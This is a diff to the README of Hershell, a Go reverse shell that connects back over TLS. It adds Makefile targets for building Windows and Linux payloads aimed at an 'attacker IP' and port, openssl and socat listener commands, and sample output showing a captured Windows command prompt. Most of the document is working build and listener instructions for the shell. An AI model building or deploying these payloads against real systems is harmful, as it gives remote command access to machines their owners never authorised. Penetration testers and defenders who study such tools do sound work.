@@ -1,7 +1,7 @@
 # Hershell
 
 Simple TCP reverse shell written in [Go](https://golang.org).
-It uses TLS to secure the communications.
+It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.
 
 ## Why ?
 
@@ -12,18 +12,39 @@ The goal of this project is to get a simple reverse shell, which can work on mul
 
 Since it's written in Go, you can cross compile the source for the desired architecture.
 
+To simplify things, you can use the provided Makefile.
+You can set the following environment variables:
+
+- GOOS : the target OS
+- GOARCH : the target architecture
+- LHOST : the attacker IP or domain name
+- LPORT : the listener port
+
+However, some helper targets are available in the ``Makefile``:
+
+- windows32
+- windows64
+- linux32
+- linux64
+
+For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.
+
 For windows:
 
 ```bash
-$ GOOS=windows GOARCH=amd64 go build --ldflags "-X main.connectString=192.168.0.1:9090 -H=windowsgui" -o reverse.exe hershell.go
+# Custom target
+$ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
+# Predifined target
+$ make windows32 LHOST=192.168.0.12 LPORT=1234
 ```
 
 For Linux:
 ```bash
-$ GOOS=linux GOARCH=amd64 go build --ldflags "-X main.connectString=192.168.0.1:9090" -o reverse.exe hershell.go
+# Custom target
+$ make GOOS=linux GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
+# Predifined target
+$ make linux32 LHOST=192.168.0.12 LPORT=1234
 ```
-
-Just use the ``GOOS`` and ``GOARCH`` variables to define the target.
 
 On the server side, you can use the openssl integrated TLS server:
 
@@ -31,9 +52,35 @@ On the server side, you can use the openssl integrated TLS server:
 # Certificate and private key generation
 $ openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
 # Start the server
-$ openssl s_server -cert /tmp/cert.pem -key /tmp/key.pem -accept 9090
+$ openssl s_server -cert /tmp/cert.pem -key /tmp/key.pem -accept 1234
+Using default temp DH parameters
+ACCEPT
+bad gethostbyaddr
+-----BEGIN SSL SESSION PARAMETERS-----
+MHUCAQECAgMDBALALwQgsR3QwizJziqh4Ps3i+xHQKs9lvp5RfsYPWjEDB68Z4kE
+MHnP0OD99CHv2u27THKvCHCggKEpgrPnKH+vNGJGPJZ42QylfkekhSwY5Mtr5qYI
+5qEGAgRYgSfgogQCAgEspAYEBAEAAAA=
+-----END SSL SESSION PARAMETERS-----
+Shared ciphers:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:DES-CBC3-SHA
+Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
+Shared Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
+Supported Elliptic Curve Point Formats: uncompressed
+Supported Elliptic Curves: P-256:P-384:P-521
+Shared Elliptic curves: P-256:P-384:P-521
+CIPHER is ECDHE-RSA-AES128-GCM-SHA256
+Secure Renegotiation IS supported
+Microsoft Windows [version 10.0.10586]
+(c) 2015 Microsoft Corporation. Tous droits rservs.
+
+C:\Users\LAB2\Downloads>
 ```
 
-## TODO
+Or even better, use socat with its __readline__ module, which gives you a handy history feature:
 
-- Certificate pinning
+```bash
+$ socat readline openssl-listen:1234,fork,reuseaddr,verify=0,cert=server.pem
+Microsoft Windows [version 10.0.10586]
+(c) 2015 Microsoft Corporation. Tous droits rservs.
+
+C:\Users\LAB2\Downloads>
+```
